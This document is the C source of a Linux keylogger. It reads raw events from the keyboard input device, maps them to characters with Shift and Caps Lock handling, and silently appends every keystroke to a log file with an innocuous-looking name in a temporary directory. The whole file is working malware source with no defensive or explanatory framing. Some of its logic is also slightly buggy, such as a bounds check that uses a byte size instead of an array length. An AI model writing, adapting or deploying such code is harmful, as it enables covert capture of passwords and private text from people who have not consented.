#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>

#define lch lkeys[ev.code-2]
#define uch ukeys[ev.code-2]
#define sch shift[ev.code-2]
#define F_FLAGS O_WRONLY | O_CREAT | O_APPEND

static const char *const lkeys[] = {
  "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
  "<BACKSPACE>", "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i",
  "o", "p", "[", "]", "", "", "a", "s", "d", "f", "g", "h", "j",
  "k", "l", ";", "'", "`", "", "\\", "z", "x", "c", "v", "b", "n",
  "m", ",", ".", "/", "", "*", "", " ", ""};

static const char *const ukeys[] = {
  "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
  "<BACKSPACE>", "<TAB>", "Q", "W", "E", "R", "T", "Y", "U", "I",
  "O", "P", "[", "]", "", "", "A", "S", "D", "F", "G", "H", "J",
  "K", "L", ";", "'", "`", "", "\\", "Z", "X", "C", "V", "B", "N",
  "M", ",", ".", "/", "", "*", "", " ", ""};

static const char *const shift[] = {
  "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
  "<BACKSPACE>", "<TAB>", "Q", "W", "E", "R", "T", "Y", "U", "I",
  "O", "P", "{", "}", "", "", "A", "S", "D", "F", "G", "H", "J",
  "K", "L", ":", "\"", "~", "", "|", "Z", "X", "C", "V", "B", "N",
  "M", "<", ">", "?", "", "*", "", " ", ""};

int main();
void openPaths(int fd[]);
void checkDir(char *path);
void logKeys(int fd[], struct input_event);

void checkDir(char *path){
	struct stat sb;
	int err = stat(path, &sb);
	if(err == -1) {
		if(ENOENT == errno)
			mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
	}
	else {
		if(!S_ISDIR(sb.st_mode)) {
			remove(path);
			mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
		}
	}
}

void openPaths(int fd[]){
  checkDir("/tmp/tmp54e3zO/");
  fd[0] = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
  fd[1] = open("/tmp/tmp54e3zO/tmp54e3z0.log", F_FLAGS , 0644);

  if (fd[0] == -1){ perror("fd[0]"); exit(-1); } /* Can't open /dev/ */
  else if (fd[1] == -1) {perror("fd[1]"); exit(-1); } /* Can't open tmp file */
}

void logKeys(int fd[], struct input_event ev){
  ssize_t n;
  int caps_state=0, shift_state=0;

  while(1){
      n = read(fd[0], &ev, sizeof ev); /* Read keys from /dev/input/... */
      if (n == -1) { /* if read fails, see why */
        if (errno == EINTR) /* read has been interrupted by a signal, carry on */
          continue;
        else /* Something awful happened! ABORT! */
          break;
      }
      if (ev.type == EV_KEY && (ev.value >= 0 && ev.value <= 2)){
        /* Determine Caps_state and Shift_state */
        if (ev.value == 1 && ev.code == 58){
          (caps_state == 0) ? (caps_state = 1) : (caps_state = 0);
        }
        if (ev.value == 1 && ev.code == 54){
          shift_state = 1;
        }
        else if (ev.value == 0 && ev.code == 54){
          shift_state = 0;
        }
        if (ev.value != 1){
          /* Delete a character */
          if (ev.code == 14){
            write(fd[1], "<BACKSPACE>", 11);
          }
          else if (ev.code == 28){
            write(fd[1], "\n", 1);
          }
		  else if (ev.code > sizeof(lkeys));
          /* Print characters to file */
          else {
            if (caps_state && !shift_state){
              write(fd[1], uch, strlen(uch));
            }
            else if (shift_state){
              write(fd[1], sch, strlen(sch));
            }
            else {
              write(fd[1], lch, strlen(lch));
            }
          }
        }
      }
    }
}

int main(){
  int fd[2];
	struct input_event ev;

  /* Directory and file opening */
  openPaths(fd);
  /* Time to grab some keys */
  logKeys(fd, ev);

  close(fd[0]);
  close(fd[1]);
  return -1;
}
